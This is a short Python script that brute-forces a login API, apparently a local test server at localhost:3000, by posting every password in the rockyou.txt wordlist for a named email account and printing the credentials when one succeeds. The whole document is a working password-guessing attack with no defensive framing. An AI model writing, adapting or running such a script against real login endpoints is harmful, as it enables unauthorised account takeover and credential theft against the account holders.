import requests
import chardet


#Define API endpoint, username, wordlist file
api_endpoint = 'http://localhost:3000/api/login'    
username = 'nadech@gmail.com'
wordlist = 'rockyou.txt'


#Open wordlist file
# with open(wordlist, "rb") as passwords_file:
#     passwords = passwords_file.read().splitlines()
with open(wordlist, "rb") as passwords_file:
    rawdata = passwords_file.read()
    result = chardet.detect(rawdata)
    encoding = result['encoding']

with open(wordlist, "r", encoding=encoding) as passwords_file:
    passwords = passwords_file.read().splitlines()    


#Call API to check any passwords
for password in passwords:            
    response = requests.post(api_endpoint, data={'username': username, 'password': password})
    if response.json()['status'] == True:
        print(f'username: {username}')
        print(f'password: {password}')
        break   

